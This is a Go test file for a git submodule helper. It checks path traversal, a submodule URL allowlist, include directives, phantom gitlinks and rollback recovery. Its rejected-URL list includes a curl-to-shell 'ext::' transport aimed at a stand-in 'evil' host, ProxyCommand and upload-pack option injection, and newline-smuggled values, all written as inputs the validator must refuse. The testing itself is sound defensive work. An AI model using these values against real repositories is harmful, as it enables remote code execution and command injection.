package gitx

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestSubmoduleMetadataRejectsUnrelatedStagedEdits(t *testing.T) {
	dir := newRepo(t)
	writePackage(t, dir, "pkg", "file")
	if err := AddAndCommit(dir, []string{"pkg"}, "initial"); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, ".gitmodules")
	if err := os.WriteFile(path, []byte("# unrelated edit\n"), 0644); err != nil {
		t.Fatal(err)
	}
	gitOutput(t, dir, "add", ".gitmodules")
	if err := CheckSubmoduleMetadata(context.Background(), dir); err == nil {
		t.Fatal("unrelated staged metadata was accepted")
	}
}

func TestRepositoryWorktreeIsNotConvertible(t *testing.T) {
	dir := newRepo(t)
	writePackage(t, dir, "pkg", "file")
	if err := AddAndCommit(dir, []string{"pkg"}, "initial"); err != nil {
		t.Fatal(err)
	}
	worktree := filepath.Join(t.TempDir(), "worktree")
	gitOutput(t, dir, "worktree", "add", "--detach", worktree)
	for _, path := range []string{dir, worktree} {
		if info := InspectRepository(context.Background(), path); info.Reason == "" {
			t.Fatalf("worktree accepted: %+v", info)
		}
	}
}

func TestSubmodulePathsRejectTraversal(t *testing.T) {
	for _, path := range []string{"../outside", "/outside", "pkg/../../outside", "pkg/.git/repo", "-option", "pkg/repo\nother"} {
		if err := safeRelative(path); err == nil {
			t.Fatalf("accepted %q", path)
		}
	}
	for _, url := range []string{"", "-option", "https://example.invalid/repo\nother", "../relative"} {
		if err := ValidateSubmoduleURL(url); err == nil {
			t.Fatalf("accepted %q", url)
		}
	}
}

func TestValidateSubmoduleURLAllowlist(t *testing.T) {
	accepted := []string{
		"https://example.invalid/repo.git",
		"HTTPS://example.invalid/repo.git",
		"ssh://git@example.invalid/repo.git",
		"git://example.invalid/repo.git",
		"git@example.invalid:user/repo.git",
		"/abs/local/repo.git",
	}
	for _, url := range accepted {
		if err := ValidateSubmoduleURL(url); err != nil {
			t.Fatalf("rejected %q: %v", url, err)
		}
	}
	rejected := []string{
		"",
		"   ",
		"ext::sh -c 'curl evil|sh'",
		"http://example.invalid/repo.git",
		"file:///tmp/r",
		"https://user:pass@example.invalid/r",
		"ssh://-oProxyCommand=x/y",
		" https://example.invalid/repo.git",
		"https://example.invalid/repo.git ",
		"../relative",
		"foo://x/y",
		"https://example.invalid",
		"https:///repo.git",
		"-upload-pack=x:y",
		"https://example.invalid/repo\nother",
		"https://example.invalid/repo\x7fgit",
		strings.Repeat("h", 3000),
	}
	for _, url := range rejected {
		if err := ValidateSubmoduleURL(url); err == nil {
			t.Fatalf("accepted %q", url)
		}
	}
}

func TestRepositoryOriginLocalPathIsResolvedBeforeMove(t *testing.T) {
	dir := newRepo(t)
	writePackage(t, dir, "pkg", "file")
	if err := AddAndCommit(dir, []string{"pkg"}, "initial"); err != nil {
		t.Fatal(err)
	}
	gitOutput(t, dir, "remote", "add", "origin", "../remote.git")
	info := InspectRepository(context.Background(), dir)
	if info.Reason != "" || info.URL != filepath.Join(filepath.Dir(dir), "remote.git") {
		t.Fatalf("repository: %+v", info)
	}
}

func addGitlink(t *testing.T, dir, rel string) {
	t.Helper()
	writePackage(t, dir, filepath.Dir(rel), "file")
	if err := AddAndCommit(dir, []string{filepath.Dir(rel)}, "seed"); err != nil {
		t.Fatal(err)
	}
	sha := strings.TrimSpace(gitOutput(t, dir, "rev-parse", "HEAD"))
	gitOutput(t, dir, "update-index", "--add", "--cacheinfo", "160000,"+sha+","+rel)
}

func TestSubmoduleDestinationRejectsNestedRegistrations(t *testing.T) {
	dir := newRepo(t)
	writePackage(t, dir, "seed", "file")
	if err := AddAndCommit(dir, []string{"seed"}, "initial"); err != nil {
		t.Fatal(err)
	}
	modules := "[submodule \"a/b\"]\n\tpath = a/b\n\turl = https://example.invalid/repo.git\n"
	if err := os.WriteFile(filepath.Join(dir, ".gitmodules"), []byte(modules), 0644); err != nil {
		t.Fatal(err)
	}
	for _, rel := range []string{"a", "a/b", "a/b/c"} {
		if err := ValidateSubmoduleDestination(context.Background(), dir, rel); err == nil {
			t.Fatalf("accepted %q", rel)
		}
	}
	if err := ValidateSubmoduleDestination(context.Background(), dir, "c"); err != nil {
		t.Fatalf("rejected %q: %v", "c", err)
	}
}

func TestSubmoduleDestinationReportsRegistrationBeforeLeftoverMetadata(t *testing.T) {
	dir := newRepo(t)
	writePackage(t, dir, "seed", "file")
	if err := AddAndCommit(dir, []string{"seed"}, "initial"); err != nil {
		t.Fatal(err)
	}
	rel := "zsh/dot-oh-my-zsh/custom/plugins/pnpm"
	modules := "[submodule \"" + rel + "\"]\n\tpath = " + rel + "\n\turl = https://example.invalid/repo.git\n"
	if err := os.WriteFile(filepath.Join(dir, ".gitmodules"), []byte(modules), 0644); err != nil {
		t.Fatal(err)
	}
	moduleDir := filepath.Join(dir, ".git", "modules", rel)
	if err := os.MkdirAll(moduleDir, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(moduleDir, "HEAD"), []byte("ref: refs/heads/main\n"), 0644); err != nil {
		t.Fatal(err)
	}

	err := ValidateSubmoduleDestination(context.Background(), dir, rel)
	if err == nil || !strings.Contains(err.Error(), "already registered") {
		t.Fatalf("registered submodule reported as: %v", err)
	}

	for _, ancestor := range []string{"zsh", "zsh/dot-oh-my-zsh", "zsh/dot-oh-my-zsh/custom/plugins"} {
		err := ValidateSubmoduleDestination(context.Background(), dir, ancestor)
		if err == nil || !strings.Contains(err.Error(), "already registered") {
			t.Fatalf("%s reported as: %v", ancestor, err)
		}
	}
}

func TestSubmoduleDestinationIgnoresModulePathComponents(t *testing.T) {
	dir := newRepo(t)
	writePackage(t, dir, "seed", "file")
	if err := AddAndCommit(dir, []string{"seed"}, "initial"); err != nil {
		t.Fatal(err)
	}
	leftover := filepath.Join(dir, ".git", "modules", "zsh/dot-oh-my-zsh/custom/plugins/pnpm")
	if err := os.MkdirAll(leftover, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(leftover, "HEAD"), []byte("ref: refs/heads/main\n"), 0644); err != nil {
		t.Fatal(err)
	}

	for _, rel := range []string{"zsh", "zsh/dot-oh-my-zsh", "zsh/dot-oh-my-zsh/custom/plugins", "zsh/dot-oh-my-zsh/custom/plugins/other"} {
		if err := ValidateSubmoduleDestination(context.Background(), dir, rel); err != nil {
			t.Fatalf("%s rejected because of an unrelated module path component: %v", rel, err)
		}
	}

	err := ValidateSubmoduleDestination(context.Background(), dir, "zsh/dot-oh-my-zsh/custom/plugins/pnpm")
	if err == nil || !strings.Contains(err.Error(), "leftover submodule metadata") {
		t.Fatalf("leftover metadata reported as: %v", err)
	}
	if !strings.Contains(err.Error(), leftover) {
		t.Fatalf("the error does not name the directory to remove: %v", err)
	}
}

func TestSafeRelativeRejectsCaseVariantsOfGit(t *testing.T) {
	for _, path := range []string{"pkg/.GIT/x", "pkg/.Git", ".gIt/x"} {
		if err := safeRelative(path); err == nil {
			t.Fatalf("accepted %q", path)
		}
	}
}

func TestSafeParentsRejectsPathOutsideRoot(t *testing.T) {
	root := t.TempDir()
	if err := safeParents(root+string(filepath.Separator), filepath.Join(root, "a", "b")); err != nil {
		t.Fatalf("rejected a path inside the root: %v", err)
	}
	if err := safeParents(root+string(filepath.Separator), filepath.Join(filepath.Dir(root), "outside", "b")); err == nil {
		t.Fatal("accepted a path outside the root")
	}
}

func TestPhantomGitlinkIsRejected(t *testing.T) {
	dir := newRepo(t)
	addGitlink(t, dir, "a/b")
	err := CheckSubmoduleMetadata(context.Background(), dir)
	if err == nil || !strings.Contains(err.Error(), "a/b") {
		t.Fatalf("metadata check: %v", err)
	}
	links, err := IndexGitlinks(context.Background(), dir)
	if err != nil || len(links) != 1 || links[0] != "a/b" {
		t.Fatalf("gitlinks: %v %v", links, err)
	}
	if err := ValidateSubmoduleDestination(context.Background(), dir, "a/b/c"); err == nil {
		t.Fatal("accepted a destination under a phantom Git link")
	}
}

func TestListSubmodulesRejectsIncludeDirectives(t *testing.T) {
	dir := newRepo(t)
	for _, content := range []string{
		"[include]\n\tpath = ../evil\n",
		"[INCLUDE]\n\tpath = ../evil\n",
		"[includeIf \"gitdir:/\"]\n\tpath = ../evil\n",
		"[submodule \"a\"]\n\tpath = a\n\turl = https://example.invalid/a.git\n[include]\n\tpath = ../evil\n",
	} {
		if err := os.WriteFile(filepath.Join(dir, ".gitmodules"), []byte(content), 0644); err != nil {
			t.Fatal(err)
		}
		if _, err := ListSubmodules(context.Background(), dir); err == nil {
			t.Fatalf("accepted %q", content)
		}
	}
}

func TestListSubmodulesParsesMultipleEntries(t *testing.T) {
	dir := newRepo(t)
	content := "[submodule \"a\"]\n\tpath = a\n\turl = https://example.invalid/a.git\n" +
		"[submodule \"b/c\"]\n\tpath = b/c\n\turl = https://example.invalid/c.git\n"
	if err := os.WriteFile(filepath.Join(dir, ".gitmodules"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	modules, err := ListSubmodules(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(modules) != 2 {
		t.Fatalf("modules: %+v", modules)
	}
	want := []Submodule{
		{Name: "a", Path: "a", URL: "https://example.invalid/a.git"},
		{Name: "b/c", Path: "b/c", URL: "https://example.invalid/c.git"},
	}
	for i, m := range modules {
		if m != want[i] {
			t.Fatalf("module %d: %+v", i, m)
		}
	}
	if err := os.WriteFile(filepath.Join(dir, ".gitmodules"), []byte("[core]\n\tbare = false\n"), 0644); err != nil {
		t.Fatal(err)
	}
	modules, err = ListSubmodules(context.Background(), dir)
	if err != nil || len(modules) != 0 {
		t.Fatalf("modules without submodules: %+v %v", modules, err)
	}
	if err := os.WriteFile(filepath.Join(dir, ".gitmodules"), []byte("[submodule \"a\"\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if _, err := ListSubmodules(context.Background(), dir); err == nil {
		t.Fatal("accepted a malformed .gitmodules")
	}
}

func TestModuleConfigBlobFailsClosed(t *testing.T) {
	dir := newRepo(t)
	writePackage(t, dir, "pkg", "file")
	if err := AddAndCommit(dir, []string{"pkg"}, "initial"); err != nil {
		t.Fatal(err)
	}
	if got, err := moduleConfigBlob(context.Background(), dir, "HEAD:.gitmodules"); err != nil || len(got) != 0 {
		t.Fatalf("absent blob: %+v %v", got, err)
	}
	content := "[submodule \"a\"]\n\tpath = a\n\turl = https://example.invalid/a.git\n"
	if err := os.WriteFile(filepath.Join(dir, ".gitmodules"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	gitOutput(t, dir, "add", ".gitmodules")
	got, err := moduleConfigBlob(context.Background(), dir, ":.gitmodules")
	if err != nil || got["submodule.a\x00path"] != "a" {
		t.Fatalf("staged blob: %+v %v", got, err)
	}
	if _, err := moduleConfigBlob(context.Background(), dir, "HEAD:.gitmodules"); err != nil {
		t.Fatalf("committed blob: %v", err)
	}
	if _, err := moduleConfigBlob(context.Background(), dir, "deadbeef:.gitmodules"); err != nil {
		t.Fatalf("unknown revision: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, ".gitmodules"), []byte("[include]\n\tpath = ../evil\n"), 0644); err != nil {
		t.Fatal(err)
	}
	gitOutput(t, dir, "add", ".gitmodules")
	if _, err := moduleConfigBlob(context.Background(), dir, ":.gitmodules"); err == nil {
		t.Fatal("accepted a blob with an include directive")
	}
}

func TestGitTransactionPreservesRecoveryOnRollbackFailure(t *testing.T) {
	dir := newRepo(t)
	tx, err := BeginSubmoduleTransaction(dir)
	if err != nil {
		t.Fatal(err)
	}
	tx.undo = append(tx.undo, func() error { return os.ErrPermission })
	if err := tx.Rollback(); err == nil || !strings.Contains(err.Error(), tx.recoveryDir) {
		t.Fatalf("rollback: %v", err)
	}
	if _, err := os.Stat(filepath.Join(tx.recoveryDir, "config")); err != nil {
		t.Fatalf("recovery copy missing: %v", err)
	}
}

func TestCopyGitMetadataPreservesPermissions(t *testing.T) {
	source, destination := t.TempDir(), t.TempDir()
	path := filepath.Join(source, "config")
	if err := os.WriteFile(path, []byte("private"), 0600); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(source, 0700); err != nil {
		t.Fatal(err)
	}
	if err := copyGitMetadata(context.Background(), source, destination); err != nil {
		t.Fatal(err)
	}
	for _, item := range []struct {
		path string
		mode os.FileMode
	}{{destination, 0700}, {filepath.Join(destination, "config"), 0600}} {
		info, err := os.Stat(item.path)
		if err != nil || info.Mode().Perm() != item.mode {
			t.Fatalf("permissions: %v %v", info, err)
		}
	}
}
